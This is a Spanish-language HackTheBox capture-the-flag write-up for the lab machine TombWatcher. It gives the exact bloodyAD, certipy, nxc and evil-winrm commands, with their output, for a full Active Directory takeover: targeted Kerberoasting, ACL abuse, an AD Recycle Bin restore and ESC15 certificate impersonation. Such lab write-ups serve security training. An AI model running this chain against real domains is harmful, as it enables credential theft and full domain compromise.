---
title: "HTB: TombWatcher"
date: 2026-04-15 12:00:00 +0000
categories: [WriteUp, HackTheBox]
tags: [Active Directory, Windows, ADCS, ESC15, Kerberoasting, GMSA, BloodyAD, AD-RecycleBin, CVE-2024-49019]
image:
  path: /assets/img/TombWatcher-HTB.png
  alt: HackTheBox TombWatcher Machine
  width: 500
  height: 280
  class: sz-contain
---

## Introducción

**TombWatcher** es una máquina de **HackTheBox** enfocada en entornos de **Active Directory**.
El acceso inicial se obtiene abusando de un permiso **WriteSPN** para realizar **Targeted
Kerberoasting** sobre el usuario `Alfred`, cuyo hash se crackea para obtener sus credenciales.
A partir de ahí, se encadena una serie de abusos de **ACLs**: `AddSelf` para unirse al grupo
**Infrastructure**, lectura de contraseña **GMSA** de `ansible_dev$`, `ForceChangePassword`
sobre `SAM` y `WriteOwner` para comprometer al usuario `john`. La escalada de privilegios
involucra la restauración de un objeto eliminado (**AD Recycle Bin**), la recuperación de la
cuenta `cert_admin` que mantiene derechos de enrolamiento en un template **ADCS**, y la
explotación de **ESC15 (CVE-2024-49019)** para impersonar al `Administrator` y obtener
control total del dominio.

---

## Reconocimiento

### Comprobación de conectividad

```bash
ping -c 1 10.129.232.167
```

```
64 bytes from 10.129.232.167: icmp_seq=1 ttl=127 time=92.9 ms
```

### Escaneo de Puertos

```bash
rustscan -a $IP --ulimit 1000 -r 1-65535 -- -A -sC -sV -Pn -o nmapresult.txt
```

**Resultados relevantes:**

| Puerto | Estado   | Servicio                  |
|--------|----------|---------------------------|
| 53     | open     | Simple DNS Plus           |
| 80     | open     | Microsoft IIS 10.0        |
| 88     | open     | Kerberos                  |
| 135    | open     | MS RPC                    |
| 139    | open     | NetBIOS                   |
| 389    | open     | LDAP (AD)                 |
| 445    | open     | SMB                       |
| 464    | open     | Kpasswd5                  |
| 593    | open     | RPC over HTTP             |
| 636    | open     | LDAPS                     |
| 3268   | open     | LDAP Global Catalog       |
| 3269   | filtered | LDAPS Global Catalog      |
| 5985   | open     | WinRM (HTTP)              |
| 9389   | open     | .NET Message Framing      |

### Análisis del escaneo

Los puertos habituales de **Active Directory** confirman que el host es un **Controlador de Dominio** del entorno `tombwatcher.htb`.

**Observaciones clave:**

- **ADCS detectado:** Los certificados SSL exponen la CA interna `tombwatcher-CA-1`, lo que indica la presencia de **Active Directory Certificate Services**. Esto es una señal temprana de que la ruta de escalada probablemente involucre abuso de templates de certificados.
- **Firma SMB obligatoria:** Descarta ataques de relay NTLM como Responder + ntlmrelayx.
- **WinRM en 5985:** Permite acceso remoto con credenciales válidas.
- **Desfase horario:** Se detectó una diferencia de 4 horas. Crítico para Kerberos — sincronizar con `sudo ntpdate -u $IP` antes de cualquier ataque.

---

## Enumeración inicial (NXC)

```bash
nxc smb $IP -u 'henry' -p 'H3nry_987TGV!' --users
nxc smb $IP -u 'henry' -p 'H3nry_987TGV!' --shares
```

Los resultados muestran los recursos predeterminados de AD (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`) y los usuarios del dominio. Sin recursos no estándar de interés inmediato.

---

## Análisis de Dominio — BloodHound

```bash
bloodhound-ce-python -u 'henry' -p 'H3nry_987TGV!' -d tombwatcher.htb -ns $IP -c All --zip
```

BloodHound recopila todos los objetos del dominio y construye un grafo de relaciones que permite identificar la cadena completa de escalada antes de ejecutar un solo ataque.

---

## WriteSPN — Targeted Kerberoasting sobre Alfred

### ¿Qué es WriteSPN y por qué es peligroso?

El atributo **servicePrincipalName (SPN)** de una cuenta de AD define los servicios Kerberos que esa cuenta representa. El KDC usa este atributo para saber qué clave usar al emitir un Ticket de Servicio (TGS): **cifra el TGS con el hash NTLM de la cuenta que tiene ese SPN registrado**.

El permiso `WriteSPN` permite modificar este atributo en otro objeto. Esto habilita el **Targeted Kerberoasting**: asignar arbitrariamente un SPN a cualquier cuenta del dominio (aunque no sea una cuenta de servicio real), solicitar el TGS correspondiente, y crackear ese ticket offline para obtener la contraseña de esa cuenta.

**¿Por qué es más peligroso que el Kerberoasting clásico?**

El Kerberoasting clásico solo afecta a cuentas que ya tienen SPNs configurados (típicamente cuentas de servicio con contraseñas gestionadas por IT). El Targeted Kerberoasting puede apuntar a **cualquier cuenta de usuario**, incluyendo cuentas de usuario normal con contraseñas débiles que nunca fueron pensadas como objetivos de Kerberoasting.

**Flujo del ataque:**

```
henry tiene WriteSPN sobre alfred
    │
    ▼
henry asigna SPN falso a alfred
    │
    ▼
KDC emite TGS cifrado con hash NTLM de alfred
    │
    ▼
Crackeamos el TGS offline → contraseña de alfred
    │
    ▼
henry elimina el SPN (limpieza)
```

BloodHound revela que `henry` tiene `WriteSPN` sobre `alfred`:

![WriteSPN](/assets/img/tombwatcher/writespn.png)

La herramienta `targetedKerberoast` automatiza todo el proceso: asigna el SPN, solicita el TGS, lo exporta y limpia el SPN:

```bash
targetedKerberoast -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --dc-host dc01.tombwatcher.htb
```

```
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$f12e04dd...
```

```bash
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
```

**Contraseña obtenida:** `basketball`

---

## AddSelf — Alfred hacia el grupo Infrastructure

### Verificación de acceso

```bash
nxc winrm $IP -u 'alfred' -p 'basketball'
```

```
[-] tombwatcher.htb\alfred:basketball
```

`Alfred` no tiene acceso directo por WinRM. Necesitamos escalar sus permisos antes de poder usarlo para algo más. BloodHound muestra que `alfred` tiene `AddSelf` sobre el grupo **Infrastructure**:

![AddSelf](/assets/img/tombwatcher/addself.png)

### ¿Qué ganamos uniéndonos a Infrastructure?

Por sí solo, unirse a un grupo no tiene valor ofensivo inmediato. El valor está en los **permisos que ese grupo tiene sobre otros objetos**. BloodHound ya nos muestra que **Infrastructure** tiene `ReadGMSAPassword` sobre `ansible_dev$` — eso es lo que buscamos.

```bash
bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb -u 'alfred' -p 'basketball' add groupMember 'INFRASTRUCTURE' 'alfred'
```

```
[+] alfred added to INFRASTRUCTURE
```

> **Nota:** Los cambios de membresía de grupo en Kerberos no son inmediatos. El TGT actual de `alfred` no incluye el nuevo grupo hasta que se renueve. Si los ataques siguientes fallan con errores de permisos, obtener un TGT fresco con `kinit` o esperar a que expire el ticket actual.

---

## ReadGMSAPassword — Infrastructure hacia ansible_dev$

### ¿Cómo funciona ReadGMSAPassword en este contexto?

El atributo `msDS-GroupMSAMembership` de `ansible_dev$` contiene una ACL que lista qué principals pueden leer su contraseña. **Infrastructure** está en esa lista, y ahora `alfred` es miembro de **Infrastructure**, por lo que hereda ese permiso.

La consulta se hace vía **LDAP** al atributo `msDS-ManagedPassword` de la cuenta gMSA. AD devuelve el blob de contraseña directamente. NXC extrae el hash NTLM de ese blob:

```bash
nxc ldap $IP -u 'alfred' -p 'basketball' --gmsa
```

```
Account: ansible_dev$    NTLM: 7e792e4c14e4040a0b4f18235a6afe55
PrincipalsAllowedToReadPassword: Infrastructure
```

> Tenemos el hash NTLM de `ansible_dev$`. No necesitamos crackearlo — lo usaremos directamente como `-p ':7e792e4c14e4040a0b4f18235a6afe55'` en los siguientes pasos (Pass-the-Hash).

---

## ForceChangePassword — ansible_dev$ hacia SAM

### ¿Qué es ForceChangePassword?

`ForceChangePassword` es un permiso de ACL en AD que permite cambiar la contraseña de otra cuenta **sin conocer la contraseña actual**. Es diferente de un reset normal que requiere autenticación del propio usuario o privilegios de admin.

**¿Cuándo aparece este permiso legítimamente?**

En operaciones de helpdesk o scripts de automatización. Un bot de onboarding puede tener `ForceChangePassword` sobre cuentas nuevas para inicializarlas. El problema es cuando esa capacidad queda en manos de una cuenta comprometida.

**Impacto ofensivo:** No hay forma para la víctima de detectar el cambio hasta que intente autenticarse y falle. No hay alerta de "contraseña cambiada" en la mayoría de configuraciones por defecto.

BloodHound confirma que `ansible_dev$` tiene `ForceChangePassword` sobre `SAM`:

![ForceChangePassword](/assets/img/tombwatcher/forcechange.png)

```bash
bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb -u 'ansible_dev$' -p ':7e792e4c14e4040a0b4f18235a6afe55' set password 'SAM' 'Password!'
```

```
[+] Password changed successfully!
```

---

## WriteOwner — SAM hacia JOHN

### ¿Qué es WriteOwner y por qué es tan poderoso?

En Windows/AD, cada objeto tiene un **propietario** (Owner) almacenado en su descriptor de seguridad. El propietario de un objeto siempre tiene la capacidad implícita de **modificar las ACLs** de ese objeto, independientemente de los permisos explícitos configurados.

`WriteOwner` permite cambiar quién es el propietario de un objeto. Si nos convertimos en propietario, podemos:
1. Otorgarnos `GenericAll` sobre el objeto.
2. Cambiar cualquier atributo, incluyendo la contraseña.

**¿Por qué esta cadena de dos pasos?**

`WriteOwner` por sí solo no da control directo. Primero hay que **usarlo para tomar propiedad**, y luego usar esa propiedad para **otorgarse permisos adicionales**. Es un patrón de dos pasos, pero el resultado final es control total.

BloodHound muestra que `SAM` tiene `WriteOwner` sobre `john`:

![WriteOwner](/assets/img/tombwatcher/writeowner.png)

### 1. Tomar propiedad de JOHN

```bash
bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb \
  -u 'SAM' -p 'Password!' set owner 'JOHN' 'sam'
```

```
[+] Old owner is now replaced by sam on JOHN
```

### 2. Otorgarse GenericAll sobre JOHN

Ahora que `SAM` es propietario de `JOHN`, puede modificar sus ACLs para darse control total:

```bash
bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb \
  -u 'sam' -p 'Password!' add genericAll 'JOHN' 'sam'
```

```
[+] sam has now GenericAll on JOHN
```

### 3. Cambiar contraseña de JOHN

Con `GenericAll`, usamos `ForceChangePassword` implícito:

```bash
bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb \
  -u 'SAM' -p 'Password!' set password 'JOHN' 'Password!'
```

```
[+] Password changed successfully!
```

---

## Acceso Inicial — Evil-WinRM como john

```bash
evil-winrm -i $IP -u 'john' -p 'Password!'
```

```powershell
*Evil-WinRM* PS C:\Users\john> type Desktop\user.txt
9d3bf49300af2bc41300601635ded142
```

---

## Escalada de Privilegios — AD Recycle Bin + ESC15

### Enumeración ADCS

El escaneo inicial detectó la CA `tombwatcher-CA-1`. Enumeramos los templates vulnerables:

```bash
certipy find -u john -p 'Password!' -dc-ip $IP -enabled -stdout
```

```
Template Name       : WebServer
Schema Version      : 1
Enrollment Rights:
    TOMBWATCHER.HTB\Domain Admins
    TOMBWATCHER.HTB\Enterprise Admins
    S-1-5-21-1392491010-1358638721-2126982587-1111
```

![BloodHound ADCS](/assets/img/tombwatcher/acds.png)

El tercer entry en los derechos de enrolamiento es un **SID huérfano** — un identificador de seguridad que ya no resuelve a ningún nombre de objeto activo en el dominio. Esto es una señal inmediata de que la cuenta fue **eliminada**.

**¿Por qué el ACE sigue activo si la cuenta fue eliminada?**

AD almacena los ACEs como SIDs en el descriptor de seguridad del objeto. Cuando se elimina una cuenta, AD **no limpia automáticamente los ACEs** que hacen referencia a esa cuenta en otros objetos. El ACE queda huérfano. Si restauramos la cuenta (y su SID se preserva, lo que ocurre con AD Recycle Bin), los permisos se reactivan automáticamente.

---

## AD Recycle Bin — Restaurar cert_admin

### ¿Qué es AD Recycle Bin?

**AD Recycle Bin** es una funcionalidad de Active Directory (disponible desde Windows Server 2008 R2) que permite restaurar objetos eliminados **con todos sus atributos intactos**, incluyendo membresías de grupo, permisos y el SID original.

**Sin AD Recycle Bin:** Cuando se elimina un objeto en AD, la mayoría de sus atributos son eliminados y el SID ya no puede ser reutilizado. La restauración es parcial y compleja.

**Con AD Recycle Bin habilitado:** Los objetos eliminados se mueven a un contenedor especial `CN=Deleted Objects` y se conservan con todos sus atributos durante un período de tiempo (por defecto 180 días). La restauración es completa.

**¿Por qué es relevante ofensivamente?**

Si una cuenta con permisos privilegiados fue eliminada "accidentalmente" (o como medida de limpieza que no eliminó los ACEs referenciados), restaurarla reactiva todos esos permisos. Es exactamente lo que ocurre con `cert_admin` y el template **WebServer**.

### Identificar el objeto por SID

Desde Evil-WinRM como `john`, buscamos en los objetos eliminados por el SID huérfano:

```powershell
Get-ADObject -Filter 'objectSid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"' `
  -IncludeDeletedObjects -Properties *
```

```
sAMAccountName : cert_admin
isDeleted      : True
ObjectGUID     : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
LastKnownParent: OU=ADCS,DC=tombwatcher,DC=htb
```

La cuenta `cert_admin` fue eliminada pero sigue en el contenedor de objetos eliminados con su SID original preservado.

### Restaurar el objeto

```powershell
Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
```

Al restaurarse, `cert_admin` recupera automáticamente sus derechos de enrolamiento sobre el template **WebServer** porque el ACE con su SID ya estaba ahí — solo necesitaba que el SID volviera a resolver a una cuenta activa.

### Tomar control de cert_admin

Como `john`, nos otorgamos `GenericAll` sobre la cuenta recién restaurada:

```bash
bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb \
  -u 'john' -p 'Password!' add genericAll cert_admin john
```

```
[+] john has now GenericAll on cert_admin
```

### Habilitar y resetear contraseña

Los objetos restaurados desde Recycle Bin vuelven en estado **deshabilitado** por defecto. Hay que habilitarlos explícitamente:

```powershell
Enable-ADAccount -Identity cert_admin
```

```bash
bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb \
  -u 'john' -p 'Password!' set password cert_admin 'Password!'
```

```
[+] Password changed successfully!
```

---

## ESC15 — CVE-2024-49019

### ¿Qué es ESC15?

**ESC15** es una vulnerabilidad en **Active Directory Certificate Services** descubierta en 2024. Afecta exclusivamente a templates de certificado con **Schema Version 1**, que es la versión original presente en AD desde Windows 2000.

**¿Por qué Schema Version 1 es vulnerable?**

Los templates de Schema Version 1 no tienen el atributo `msPKI-RA-Application-Policies`. Este atributo es el mecanismo que usan los templates modernos (versión 2+) para que la CA pueda **validar y restringir** qué Application Policies se incluyen en el certificado emitido.

Sin este atributo, si el template tiene **"Enrollee Supplies Subject"** habilitado (el solicitante controla el contenido del CSR), el atacante puede incluir libremente cualquier Application Policy en su Certificate Signing Request, y la CA las acepta sin validación.

**¿Qué son las Application Policies (Extended Key Usage)?**

Las Application Policies (también llamadas Extended Key Usage) definen para qué puede usarse un certificado:
- `1.3.6.1.5.5.7.3.2` → Client Authentication
- `1.3.6.1.5.5.7.3.1` → Server Authentication
- `1.3.6.1.4.1.311.20.2.1` → **Certificate Request Agent (Enrollment Agent)**

El OID de **Enrollment Agent** es el crítico: permite usar el certificado para **solicitar certificados en nombre de otros usuarios**. Normalmente requiere un template especial y aprobación de administrador. Con ESC15, cualquier usuario con derechos de enrolamiento en un template Schema V1 puede auto-emitirse un certificado con este OID.

**Flujo completo del ataque:**

```
cert_admin tiene derechos de enrolamiento en WebServer (Schema V1)
    │
    ▼
Paso 1: Solicitar certificado con OID de Enrollment Agent inyectado
        → La CA lo acepta sin validar (Schema V1 sin msPKI-RA-Application-Policies)
        → Obtenemos cert_admin.pfx con capacidad de Enrollment Agent
    │
    ▼
Paso 2: Usar cert_admin.pfx para solicitar certificado en nombre de Administrator
        → La CA verifica que el solicitante tiene un certificado de Enrollment Agent válido
        → Emite administrator.pfx con UPN = administrator@tombwatcher.htb
    │
    ▼
Paso 3: Usar administrator.pfx para autenticarse vía PKINIT
        → KDC verifica el certificado y emite un TGT para Administrator
        → Obtenemos hash NT de Administrator vía UnPAC-the-Hash
```

### Confirmar la vulnerabilidad

```bash
certipy find -u cert_admin@tombwatcher.htb -p 'Password!' \
  -dc-host dc01.tombwatcher.htb -vulnerable -stdout
```

```
Template Name       : WebServer
Schema Version      : 1
Enrollee Supplies Subject: True
[!] Vulnerabilities
  ESC15: Enrollee supplies subject and schema version is 1.
```

### Paso 1 — Obtener certificado como Enrollment Agent

Inyectamos el OID `1.3.6.1.4.1.311.20.2.1` en el CSR:

```bash
certipy req -u cert_admin@tombwatcher.htb -p 'Password!' -dc-ip $IP -ca tombwatcher-CA-1 -template WebServer -application-policies '1.3.6.1.4.1.311.20.2.1'
```

```
[*] Successfully requested certificate
[*] Saving certificate and private key to 'cert_admin.pfx'
```

### Paso 2 — Impersonar Administrator

Usamos `cert_admin.pfx` (ahora con capacidad de Enrollment Agent) para solicitar un certificado en nombre del Administrator. La CA verifica que tenemos un Enrollment Agent válido y emite el certificado sin requerir intervención del Administrator:

```bash
certipy req -u cert_admin@tombwatcher.htb -p 'Password!' -dc-ip $IP -ca tombwatcher-CA-1 -target dc01.tombwatcher.htb -template User -on-behalf-of 'tombwatcher\administrator' -pfx cert_admin.pfx
```

```
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Saving certificate and private key to 'administrator.pfx'
```

### Paso 3 — Autenticarse con PKINIT y extraer el hash NT

**PKINIT** es una extensión de Kerberos que permite usar certificados X.509 en lugar de contraseñas para obtener TGTs. El KDC verifica la firma del certificado contra la CA del dominio y, si es válida, emite el TGT.

**UnPAC-the-Hash** es una técnica adicional: durante la autenticación PKINIT, el KDC incluye el hash NT del usuario en una estructura cifrada del TGT (el PAC). Certipy puede extraer ese hash, lo que permite hacer Pass-the-Hash sin necesidad de crackear nada:

```bash
certipy auth -pfx administrator.pfx -dc-ip $IP
```

```
[*] Got TGT
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```

---

## Acceso Final como Administrador

Con el hash NT del Administrator usamos Pass-the-Hash directamente:

```bash
evil-winrm -i $IP -u 'administrator' -H 'f61db423bebe3328d33af26741afe5fc'
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
588042187c6e14b266f7cab41fb00267
```

**¡Máquina comprometida con éxito!**
